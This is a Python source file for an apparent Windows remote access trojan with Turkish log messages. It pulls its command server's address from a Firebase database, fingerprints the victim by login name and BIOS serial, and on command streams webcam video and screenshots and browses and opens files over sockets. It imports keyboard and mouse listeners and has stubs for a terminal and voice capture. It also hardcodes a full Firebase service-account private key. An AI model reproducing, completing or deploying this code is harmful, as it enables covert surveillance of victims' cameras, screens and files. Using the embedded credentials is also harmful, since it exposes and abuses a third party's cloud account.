import io
import json
import os
import pickle
import shutil
import subprocess
import sys
from ctypes import cdll
from socket import socket
from threading import Thread
from time import sleep

import cv2
from firebase_admin import credentials
from firebase_admin import db as realtime
from firebase_admin import initialize_app, storage
from PIL import ImageGrab
from pynput import keyboard, mouse
from win32api import GetLogicalDriveStrings

URL = "https://blank-72b5f-default-rtdb.europe-west1.firebasedatabase.app/" # firebase realtime database url

__USERSTRING__ = os.getlogin() + subprocess.check_output('wmic bios get serialnumber',
                                                             shell=True, stdin=subprocess.PIPE,
                                                             stderr=None,creationflags=0x08000000).decode().split('\n')[1].strip()

def connect(ip,port,client_type):
    try:
        soket = socket()
        soket.connect((ip,port))
        print("Bağlandı :",ip,"port :",port)
        data = bytes(str(__USERSTRING__+"||"+client_type).zfill(1024),'utf-8')
        if soket.send(data) != 0:
            return soket
        else:
            return None
    except Exception as e:
        print("Bağlantı hatası :",e)
        return None

class Terminal(Thread):
    def __init__(self):
        super().__init__()


    def run(self):
        pass

    def stop(self):
        pass

    def set_connection_data(self,ip,port):
        self.ip = ip
        self.port = port

class WatchCamera:
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port

        self.is_alive = True

    def stop(self):
        self.is_alive = False
        try:self.cam.release()
        except: pass
        try:self.soket.close()
        except: pass

    def start(self):
        try:
            self.soket = connect(self.ip,self.port,"watch_camera")
            self.cam = cv2.VideoCapture(0)
            Thread(target=self.flow).start()
        except Exception as e:
            print("Watch camera başlanamadı")

    def flow(self):
        while self.is_alive:
            try:
                cam_readed, image_data = self.cam.read()
                if not cam_readed:
                    self.is_alive = False
                    break

                image_data = pickle.dumps(image_data)
                image_len = len(image_data)
                self.soket.sendall(str(image_len).zfill(10).encode("utf-8"))
                self.soket.sendall(image_data)

            except Exception as e:
                self.stop()
                print("Watch camera flowu durdu: ",e)



class WatchScreen:
    def __init__(self,ip,port) -> None:
        self.ip = ip
        self.port = port

        self.is_alive = True

    def flow(self) -> None:
        while self.is_alive:
            try:
                print(1)
                image_io = io.BytesIO()
                ImageGrab.grab(all_screens=False).save(image_io,"JPEG")
                image_data = image_io.getvalue()
                print(2)
                length = len(image_data)
                print(3)
                self.soket.sendall(bytes(str(length).zfill(10), 'utf-8'))
                print(4)
                print(5)
                self.soket.sendall(image_data)
                print(6)
                print("Watch screen flow")
            except Exception as e:
                self.stop()
                print("Watch screen flowu durdu: ",e)


    def stop(self):
        self.is_alive = False
        try:
            self.soket.close()
        except:
            pass

    def start(self):
        try:
            self.soket = connect(self.ip,self.port,"watch_screen")
            Thread(target=self.flow).start()
        except Exception as e:
            print("Watch screen başlanamadı",e)

    def commander(self,data: dict):
        command = data["command"]
        if command == "stop":
            self.is_alive = False

        elif command == "start":
            Thread(target=self.flow).start()


class FileManager:
    def __init__(self,ip,port) -> None:
        self.ip = ip
        self.port = port
        self.is_alive = True

    def start(self):
        try:
            self.soket = connect(self.ip,self.port,"file_manager")
            Thread(target=self.command_listener).start()
        except Exception as e:
            print("File manager başlanamadı",e)

    def command_listener(self):
        while self.is_alive:
            try:
                self.commander(pickle.loads(self.soket.recv(1024)))
            except Exception as e:
                print("File manager command listener error: ",e)
                self.stop()
    
    def commander(self,data: dict):
        command = data["command"]
        print("command datası: ",data)
        if command == "disks":
            dirs = []
            for i in GetLogicalDriveStrings().split("\x00")[:-1]:
                try:
                    size = len(os.listdir(i))
                except:
                    size = -1
                dirs.append({"type":"dir","path":i,"size":size})
            data = pickle.dumps(dirs)
            data_length = str(len(data)).zfill(10).encode()
            self.soket.sendall(data_length)
            self.soket.sendall(data)
        elif command == "startfile":
            path = data["path"]
            try:os.startfile(path)
            except:pass
        elif command == "listdir":
            path = data["path"]
            content = []
            try:
                for i in os.listdir(path):
                    if os.path.isfile(os.path.join(path,i)):
                        try:
                            size = os.path.getsize(os.path.join(path,i))
                        except:
                            size = -1
                        content.append({"type":"file","path":os.path.join(path,i),"size":FileManager.convertSizeType(size)})
                    else:
                        try:
                            size = len(os.listdir(os.path.join(path,i)))
                        except:
                            size = -1
                    content.append({"type":"dir","path":os.path.join(path,i),"size":size})
            except:
                pass
            data = pickle.dumps(content)
            data_length = str(len(data)).zfill(10).encode()
            
            self.soket.sendall(data_length)
            self.soket.sendall(data)

    def stop(self):
        self.is_alive = False
        try:
            self.soket.close()
        except:
            pass

    @staticmethod
    def convertSizeType(size: int) -> str:
        if size == -1:
            return "---"
        if (size / 1024) > 1:
            kb = size / 1024
            sizeText = format(kb, ".2f") + " Kb"
            if (kb / 1024) > 1:
                mb = kb / 1024
                sizeText = format(mb, ".2f") + " Mb"
                if (mb / 1024) > 1:
                    gb = mb / 1024
                    sizeText = format(gb, ".2f") + " Gb"
        else:
            sizeText = str(size) + " byte"
        return sizeText


class ListenVoice(Thread):
    def __init__(self) -> None:
        super().__init__()

    def run(self) -> None:
        pass

    def stop(self):
        pass

    def set_connection_data(self,ip,port):
        self.ip = ip
        self.port = port

class App:
    def __init__(self) -> None:
        self.ip = ""
        self.port = 0

        self.firebase_manager = FirebaseManager()
        while True:
            try:
                self.commander(pickle.loads(self.soket.recv(1024)))
            except Exception as e:
                print("Client datası alınamadı: " + str(e))
                self.connect()

    def commander(self,data):
        command = data["command"]
        print("data: ", data)
        if command == "exit":
            exit()
        elif command == "refresh":
            os.startfile(sys.argv[0])
            exit()
        elif command == "listen_voice":
            print("Listen voice")
        elif command == "terminal":
            print("Terminal")
        elif command == "watch_screen":
            WatchScreen(self.ip,self.port).start()
        elif command == "file_manager":
            FileManager(self.ip, self.port).start()
        elif command == "watch_camera":
            WatchCamera(self.ip,self.port).start()
        else: 
            print("Yanlış gelen cmd:"+command)
            os.startfile(sys.argv[0])
            exit()

    def connect(self):
        try:
            if self.set_connection_data():
                print("ip ve port: ", self.ip, self.port)
                self.soket = connect(self.ip, self.port,"client")
            else:
                print("Bağlantı bilgileri alınamadı")
        except Exception as e:
            print("Bağlantı kurulamadı: " + str(e))
            
    def set_connection_data(self) -> bool:
        connection_data = self.firebase_manager.get_tree("/connection_informations/server")
        if connection_data is None:
            return False
        self.ip = connection_data["ip"]
        self.port = connection_data["port"]
        return True

class FirebaseManager:
    service_json_data = { # unique firebase service json data
    "type": "service_account",
    "project_id": "blank-72b5f",
    "private_key_id": "f44b95d4737ce902a7708b1ee2829ff43178caf5",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCBBsDzm8Jgwmmy\n2znfkcdjo9Y1ZlAaLAynNaSJv43hLKnhn/CTM8wI3ES12DcLmMv3owTECLhUnQqF\nMFQ94U2vWuuJWtONm0FbGwK2+1gPOaS8U0Cgl4/2lpZPgncmRSYm3VmGtBYzCxv8\nDvPyMigVGS9eq4zwQQi1ADFANqBtg1qBl0Or9vl7t8jH3NqGI0zF6ZKpjv/+j4uh\nBDJSf33LvBYlgYbLu0Xw6smZhth4DeJaeazR0cuNjTleKOYZVrhTXj4GrPpsIN3u\nFPSN6HsSfVtBpTfVlgoUSIhKPNUDHnHNcwW9a+il5VEVPhTbqYmiQLQ47ASkc/Fa\nYNsnurT5AgMBAAECggEAGCApaZOtFZccmP0tddymDf9HUT5TiYVFi2l4HeqjrqBB\nlqbnnrqvctOvBFqMtl4oe2IvxLEFuIqRukRGaDit5DVJt+n0BzUp1A15pTnbpiMm\n5rDhc3XLjTXsnqrcORtybg9zC0E2qm4wGiI4ooeW35UROrA0nwLmDCQgUWu1dSx3\nwy2jIqtGLBprOg8tM2WmFza6aPgPpFzErymx4T4hYv0YFbNJ9qqWKDD3ipWxIBNd\nJs05TGzdeVipW/mZc++OhSbKmzy1VWx/EE6VI+2meYWnstWq0KBgOGE4nqIOzw3U\nwnSkALqNE6vheLqqlfBp5hiBBD1rijd47b1vHPzghQKBgQC1y030belW/sRdfBZm\nl8xd6OZuNXnXZmAWwv/A5YvftavgiyCNKXsnmGCZUHA5V3MdAoKQR75rkWXApcYG\nSV036oMFJekqwEEbxqlfVWPXdMyt8fQ9k5c1cP8btWYTAbJ38E6fpPi1Rlcb2rX4\ng+zfCprFzY2whxgm1tkGes5mFQKBgQC1sXJxKEQhpwSC4yVmo0RIe2zTb2YE23c9\nwk2Z+HWnfrXkX7G4MyW7ZtI8XqSIdJHd3v64BUUfgFpeE5c5ASq0kxdBttNPhmZQ\n1MoJP1/o+YnmM79g60eB4725BggQ/FurZHAPhEVkM14H7MIGDNVWIuGuf8pb6h0G\n8OLJaWuQVQKBgFG4Ni6uSboFhBfR8+/iRMfiLdNUzpR5PLB+r6DyjtHdRIoHgHZ0\nMxw1bxb8BbaBDQn5Wt+ooHySO39CBaZFzFWaYZMq24mQKrRltTVZmSv9IRUAMp6L\nfelUBhlajav1k1g++djhu7shB39J7YrtIsmQZsqMACleUQkEg0JaafWRAoGAZPYq\nkqh+W3jUb+rKgKMesWwsR70yImbVdrL+rh07O4yUhEeMmL+LKvxyvGsW4GBuIazl\nO9pp05xeGsKmGF4GnfrSRIjUGO+k8Suc7NCTegEX2JxOrwtuW8XySdsJJm8kfTO9\ndVHZwVkt2hd8pSICde/CGlYWW0bXRGEclDEJPVUCgYEAk8mR7eY9WSXM46qCoEyN\nr1MsNJMEyg5245LsQq0khLjkLDzJ4/WybVD8uoA4Kyunei6Te+Wc5izHS3Qb0uHx\n+f1V8O0E5L4JYVWaxu4NYBKGJvRYiIQ5OrdrG+CK8w5BsHR/ruLXn288t4y+GEtt\nw0o8qY03QYOyWdBrrJpchtE=\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-wwjty@blank-72b5f.iam.gserviceaccount.com",
    "client_id": "110522629390398068058",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-wwjty%40blank-72b5f.iam.gserviceaccount.com",
    "storageBucket":"blank-72b5f.appspot.com"
    }

    def __init__(self) -> None:
        # initialize the firebase
        cred = credentials.Certificate(FirebaseManager.service_json_data)
        initialize_app(cred,{"storageBucket":"blank-72b5f.appspot.com"})
        self.__bucket = storage.bucket()        

    def get_tree(self,path = "/") -> dict:
        return realtime.reference(path,url=URL).get()

    def upload_string(self,string:str,file_name:str,timout = 5, retry_count = -1,delay = 5) -> bool:
        if (retry_count == -1):
            while 1:
                try:
                    blob = self.__bucket.blob(file_name)
                    blob.upload_from_string(string,timeout=timout)
                    return True
                except Exception as e:
                    print("11- Error: "+str(e))
                sleep(delay)
        else:
            for i in range(retry_count):
                try:
                    blob = self.__bucket.blob(file_name)
                    blob.upload_from_string(string,file_name,timeout=timout)
                    return True
                except Exception as e:
                    print("2- Error: "+str(e))
                sleep(delay)
            return False



App()
